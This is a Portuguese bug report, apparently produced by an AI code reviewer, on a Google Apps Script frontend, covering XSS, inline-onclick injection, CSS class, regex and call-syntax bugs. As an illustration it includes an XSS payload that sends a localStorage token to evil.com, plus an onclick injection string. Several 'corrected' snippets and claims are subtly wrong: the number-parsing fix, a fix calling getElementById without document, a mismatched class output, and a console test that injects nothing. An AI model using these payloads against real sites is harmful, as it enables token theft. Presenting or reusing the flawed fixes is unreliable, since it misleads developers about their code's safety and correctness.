# 🔴 BUGS CRÍTICOS - FRONTEND

## ⚠️ RESUMO EXECUTIVO

O frontend do sistema possui **5 bugs críticos** que podem causar:
- ❌ Vulnerabilidades de segurança (XSS)
- ❌ Quebra de funcionalidade (CSS, cálculos)
- ❌ Erros de execução JavaScript

---

## BUG #1: VULNERABILIDADE XSS - INJEÇÃO DE HTML

### 🔍 Severidade: **CRÍTICA** 🔥

### Localização
Funções: `carregarMinhasRequisicoes()`, `carregarAdmin()`, `carregarCadastrador()`

### ❌ Código Vulnerável
```javascript
lista.forEach(r => {
  const tr = document.createElement('tr');
  tr.innerHTML = `
    <td>${r.numero || ''}</td>
    <td>${r.tipo}</td>
    <td>${r.requisitante}</td>
  `;
  tbody.appendChild(tr);
});
```

### 🐛 Problema
Se qualquer campo contiver código malicioso, será executado:

```javascript
// Cenário de ataque:
r.numero = '<img src=x onerror="alert(document.cookie)">';
r.tipo = '<script>fetch(\'https://evil.com?data=\'+localStorage.getItem(\'token\'))</script>';
```

Isso permite:
- Roubo de cookies e tokens
- Redirecionamento para sites maliciosos
- Execução de código arbitrário no navegador

### ✅ Correção
```javascript
// OPÇÃO 1: Usar textContent (recomendado)
function criarCelulaSegura(texto) {
  const td = document.createElement('td');
  td.textContent = texto || '';  // Escapa automaticamente
  return td;
}

// Uso:
const tr = document.createElement('tr');
tr.appendChild(criarCelulaSegura(r.numero));
tr.appendChild(criarCelulaSegura(r.tipo));
tr.appendChild(criarCelulaSegura(r.requisitante));

// OPÇÃO 2: Escape HTML manualmente
function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = String(text);
  return div.innerHTML;
}

tr.innerHTML = `
  <td>${escapeHtml(r.numero)}</td>
  <td>${escapeHtml(r.tipo)}</td>
`;
```

### 📊 Impacto
- **Severidade:** CRÍTICA
- **Frequência:** Toda vez que exibe dados de usuários
- **Afetados:** Todos os usuários do sistema
- **Ação:** CORRIGIR IMEDIATAMENTE

---

## BUG #2: ATRIBUTOS ONCLICK VULNERÁVEIS

### 🔍 Severidade: **ALTA** 🔥

### Localização
Criação de botões em várias funções

### ❌ Código Vulnerável
```javascript
tr.innerHTML = `
  <td>
    <button onclick="editarReq('${r.id}')">Editar</button>
    <button onclick="abrirDecisao('${r.id}','${r.numero}')">Avaliar</button>
  </td>
`;
```

### 🐛 Problema
Se `r.id` ou `r.numero` contiverem aspas, quebra o JavaScript:

```javascript
r.id = "123'); maliciousCode(); ('";
// Resultado: onclick="editarReq('123'); maliciousCode(); ('')"
```

### ✅ Correção
```javascript
// Criar botão de forma segura
const tdAcoes = document.createElement('td');
const btnEditar = document.createElement('button');
btnEditar.className = 'btn btn-secondary';
btnEditar.textContent = 'Editar';
btnEditar.addEventListener('click', () => editarReq(r.id)); // ✅ Seguro
tdAcoes.appendChild(btnEditar);
tr.appendChild(tdAcoes);
```

### 📊 Impacto
- **Severidade:** ALTA
- **Frequência:** Toda vez que renderiza botões
- **Ação:** CORRIGIR URGENTEMENTE

---

## BUG #3: CLASSES CSS INVÁLIDAS (STATUS COM ESPAÇOS)

### 🔍 Severidade: **MÉDIA** ⚠️

### Localização
Template strings que geram classes CSS

### ❌ Código Problemático
```javascript
tr.innerHTML = `
  <td><span class="tag status-${r.status}">${r.status}</span></td>
`;

// Se r.status = "EM CORREÇÃO"
// Resultado: <span class="tag status-EM CORREÇÃO">
//                                           ^^^^^^^ ESPAÇO = QUEBRADO!
```

### 🐛 Problema
CSS interpreta como **duas classes separadas**: `status-EM` e `CORREÇÃO`

Isso quebra toda a estilização de status!

### ✅ Correção
```javascript
// Normalizar status para classe válida
function statusParaClasse(status) {
  return String(status).replace(/\s+/g, '-');
}

// Uso:
tr.innerHTML = `
  <td><span class="tag status-${statusParaClasse(r.status)}">${r.status}</span></td>
`;
// Resultado: <span class="tag status-EM-CORRECAO"> ✅
```

**CSS correspondente:**
```css
/* ANTES (quebrado): */
.status-EM CORREÇÃO { ... }  /* ❌ Inválido */

/* DEPOIS (correto): */
.status-EM-CORRECAO { ... }  /* ✅ Válido */
```

### 📊 Impacto
- **Severidade:** MÉDIA (visual quebrado)
- **Frequência:** Status com espaços ("EM CORREÇÃO", "ENVIADA AUTORIZAÇÃO")
- **Ação:** CORRIGIR ESTA SEMANA

---

## BUG #4: REGEX DE REPLACE INCORRETO

### 🔍 Severidade: **MÉDIA** ⚠️

### Localização
Função `recalcLinha()`

### ❌ Código Problemático
```javascript
function recalcLinha(input) {
  const tr = input.parentNode.parentNode;
  const qtd = parseFloat(tr.children[3].querySelector('input').value.replace(',', '.'));
  //                                                                         ^ SEM FLAG GLOBAL
  const vu = parseFloat(tr.children[4].querySelector('input').value.replace(',', '.'));
  const vt = qtd * vu;
  tr.children[5].querySelector('input').value = vt.toFixed(2);
}
```

### 🐛 Problema
`replace(',', '.')` substitui **apenas a primeira vírgula**!

```javascript
'1,234,56'.replace(',', '.')  // '1.234,56' ❌ INCORRETO
'1,234,56'.replace(/,/g, '.') // '1.234.56' ✅ CORRETO
```

Cálculos ficam errados se usuário digitar número com múltiplas vírgulas.

### ✅ Correção
```javascript
function sanitizeNumber(value) {
  return parseFloat(String(value).replace(/,/g, '.')) || 0;
  //                                            ^^^ flag global
}

function recalcLinha(tr) {
  const qtd = sanitizeNumber(tr.children[3].querySelector('input').value);
  const vu = sanitizeNumber(tr.children[4].querySelector('input').value);
  const vt = qtd * vu;
  tr.children[5].querySelector('input').value = vt.toFixed(2);
}
```

### 📊 Impacto
- **Severidade:** MÉDIA (cálculos incorretos)
- **Frequência:** Usuários que digitam números com vírgula
- **Ação:** CORRIGIR ESTA SEMANA

---

## BUG #5: SINTAXE JAVASCRIPT INCORRETA

### 🔍 Severidade: **BAIXA** (funciona por acaso)

### Localização
Função `carregarCadastradoresParaAdmin()`

### ❌ Código Problemático
```javascript
google.script.run
  .withSuccessHandler(function(lista){
    // ...
  }).listarCadastradoresParaAdmin = function(){}; // ❌ WTF?
```

### 🐛 Problema
Está atribuindo uma função vazia à propriedade do objeto retornado.

Isso **não faz sentido** e só funciona por coincidência!

### ✅ Correção
```javascript
google.script.run
  .withSuccessHandler(function(lista){
    const sel = getElementById('decisaoCadastrador');
    lista.forEach(u => {
      const opt = document.createElement('option');
      opt.value = u.email;
      opt.textContent = `${u.nome} (${u.email})`;
      sel.appendChild(opt);
    });
  })
  .listarCadastradoresParaAdmin(); // ✅ Chamada correta
```

### 📊 Impacto
- **Severidade:** BAIXA (funciona, mas confuso)
- **Frequência:** Uma vez por carregamento
- **Ação:** CORRIGIR QUANDO POSSÍVEL

---

## 📋 CHECKLIST DE CORREÇÃO PRIORITÁRIA

### 🔥 URGENTE (fazer hoje):
- [ ] **Bug #1:** Corrigir XSS em todas as funções que usam `innerHTML`
- [ ] **Bug #2:** Remover todos os `onclick` inline

### ⚠️ IMPORTANTE (fazer esta semana):
- [ ] **Bug #3:** Normalizar classes CSS de status
- [ ] **Bug #4:** Corrigir regex de replace para `/,/g`
- [ ] **Bug #5:** Corrigir sintaxe de chamada Google Apps Script

### 🧪 TESTES OBRIGATÓRIOS:
- [ ] Inserir `<script>alert('xss')</script>` em campos
- [ ] Verificar que não executa
- [ ] Testar status "EM CORREÇÃO" e "ENVIADA AUTORIZAÇÃO"
- [ ] Verificar estilização de badges de status
- [ ] Digitar número `1,234,56` e verificar cálculo
- [ ] Testar em Chrome, Firefox e Safari

---

## 🔧 COMO APLICAR AS CORREÇÕES

### Método 1: Correções Mínimas (1-2 horas)
Aplicar apenas as correções dos 5 bugs críticos:

1. Substituir todos `innerHTML` por criação de elementos
2. Remover `onclick` inline, usar `addEventListener`
3. Adicionar função `statusParaClasse()`
4. Adicionar função `sanitizeNumber()`
5. Corrigir sintaxe da chamada Google Apps Script

### Método 2: Refatoração Completa (4-6 horas)
Substituir todo o HTML pelo `Index-Refatorado.html`:

1. Backup do HTML atual
2. Copiar conteúdo de `Index-Refatorado.html`
3. Testar todas as funcionalidades
4. Deploy em produção

---

## 🎯 PRIORIDADE POR SEVERIDADE

| Bug | Severidade | Impacto | Prioridade |
|-----|-----------|---------|------------|
| #1 XSS | CRÍTICA 🔥 | Segurança | P0 - Hoje |
| #2 Onclick | ALTA 🔥 | Segurança | P0 - Hoje |
| #3 CSS | MÉDIA ⚠️ | Visual | P1 - Semana |
| #4 Regex | MÉDIA ⚠️ | Cálculos | P1 - Semana |
| #5 Sintaxe | BAIXA | Confusão | P2 - Mês |

---

## 📞 TESTE RÁPIDO DE SEGURANÇA

Execute este teste **agora** para confirmar a vulnerabilidade:

1. Abra o sistema em modo desenvolvedor (F12)
2. No console, execute:
   ```javascript
   // Simular dados maliciosos
   const dadosMaliciosos = {
     numero: '<img src=x onerror="alert(\'XSS VULNERÁVEL!\')">'
   };
   ```
3. Se um alerta aparecer ao carregar a tabela → **VULNERÁVEL** ❌
4. Se nada acontecer → **PROTEGIDO** ✅

---

**IMPORTANTE:** Os bugs #1 e #2 são **CRÍTICOS DE SEGURANÇA**.
Não ignore! Corrija **hoje**.

**Última atualização:** 2025-11-15
**Responsável:** Claude Code Review System
